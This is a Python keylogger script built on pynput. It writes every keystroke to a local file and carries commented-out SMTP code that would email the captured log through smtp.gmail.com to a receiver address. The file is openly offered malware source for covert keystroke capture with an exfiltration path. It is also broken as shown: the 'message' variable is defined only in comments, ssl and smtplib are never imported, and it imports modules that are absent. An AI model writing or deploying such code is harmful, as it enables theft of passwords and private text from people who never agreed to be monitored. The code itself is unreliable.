from pynput import keyboard
from pynput.keyboard import Key,Listener
import keylogger
import sendmail
# sender_mail = "user@domain.com"     
# receiver_mail = "userdomain@gmail.com"  
# password ="mail-password"              
# port = 58
# message = """From: user@domain@gmail.com
# To: user@domain@gmail.com                         
# Subject: KeyLogs
# Text: Keylogs """
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()
def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\nenter Pressed")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write("\nSpace Pressed\n")
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))
def on_key_release(Key):
    if(Key == keyboard.Key.esc):
        return False
with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
    listener.join()
with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()
# context = ssl.create_default_context()
# server = smtplib.SMTP('smtp.gmail.com', port)
# server.ehlo()
# server.starttls(context=context)
# server.ehlo()
# server.login(sender_mail,password)
# server.sendmail(sender_mail,receiver_mail,message)
# print("Email Sent to ",sender_mail)
# server.quit()
